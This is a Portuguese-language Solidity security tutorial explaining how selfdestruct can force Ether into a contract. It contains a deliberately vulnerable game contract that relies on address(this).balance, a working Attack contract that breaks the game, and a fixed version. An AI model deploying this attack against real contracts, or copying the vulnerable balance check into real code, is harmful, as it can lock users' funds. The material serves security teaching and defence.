# Autodestruição

Contratos podem ser apagados do blockchain chamando `selfdestruct`.

`selfdestruct` envia todo Ether restante armazenado no contrato para o endereço designado.

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

Um contrato malicioso pode usar `selfdestruct` para forçar o envio de Ether para qualquer contrato.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

// A meta deste jogo é ser o 7o. jogador a depositar 1 Ether.
// Jogadores podem depositar somente 1 Ether de cada vez.
// O vencedor será capaz de retirar todo Ether.

/*
1. Implemente EtherGame
2. Jogadores (vamos dizer Alice e Bob) decidem jogar, depositam 1 Ether cada.
2. Implemente Attack com endereço do EtherGame
3. Chame Attack.attack enviando 5 ether. Isso quebrará o jogo.
   Ninguém pode se tornar campeão.

O que aconteceu?
Attack forçou o balanço do EtherGame para 7 ether.
Agora ninguém pode depositar e não se pode estabelecer um campeão.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // Você pode simplesmente quebrar o jogo enviando ether de forma que
        // o saldo do jogo >= 7 ether

        // lance address a pagar
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
```

#### Técnicas preventivas <a href="#preventative-techniques" id="preventative-techniques"></a>

`Não conte com` `address(this).balance`

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
```
